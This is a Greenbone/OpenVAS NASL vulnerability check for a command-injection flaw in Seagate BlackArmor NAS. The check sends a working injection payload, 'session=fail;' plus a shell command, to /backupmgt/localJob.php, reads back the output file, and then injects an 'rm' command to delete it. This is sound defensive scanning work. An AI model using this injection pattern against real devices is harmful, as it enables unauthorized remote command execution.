# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE_PREFIX = "cpe:/o:seagate:blackarmor";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146343");
  script_version("2021-07-21T09:35:53+0000");
  script_tag(name:"last_modification", value:"2021-07-22 11:15:29 +0000 (Thu, 22 Jul 2021)");
  script_tag(name:"creation_date", value:"2021-07-21 08:10:35 +0000 (Wed, 21 Jul 2021)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"remote_banner");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Seagate BlackArmor NAS RCE Vulnerability (Jul 2021)");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_seagate_blackarmor_nas_detect.nasl");
  script_mandatory_keys("seagate/blackarmor_nas/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Seagate BlackArmor NAS is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"A command injection vulnerability exists in /backupmgt/localJob.php.");

  script_tag(name:"affected", value:"Seagate BlackArmor NAS 220. Other devices might be affected
  as well.");

  script_tag(name:"solution", value:"No known solution is available as of 21st July, 2021.
  Information regarding this issue will be updated once solution details are available.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/50132");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

cmds = exploit_commands("linux");

vt_strings = get_vt_strings();
file = vt_strings["default_rand"];

foreach pattern (keys(cmds)) {
  url = "/backupmgt/localJob.php?session=fail;" + cmds[pattern] + "+>+" + file + "%00";

  req = http_get(port: port, item: url);
  http_keepalive_send_recv(port: port, data: req);

  res_url = "/backupmgt/" + file;
  req = http_get(port: port, item: res_url);
  res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

  if (egrep(pattern: pattern, string: res)) {
    info['HTTP Method'] = "GET";
    info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

    report  = 'By doing the following HTTP request:\n\n';
    report += text_format_table(array: info) + '\n\n';
    report += 'it was possible to execute the "' + cmds[pattern] + '" command on the target host.';
    report += '\n\nResult:\n\n' + res;
    expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
    security_message(port: port, data: report, expert_info: expert_info);

    url = "/backupmgt/localJob.php?session=fail;rm+" + file + "%00";
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
    exit(0);
  }
}

exit(99);
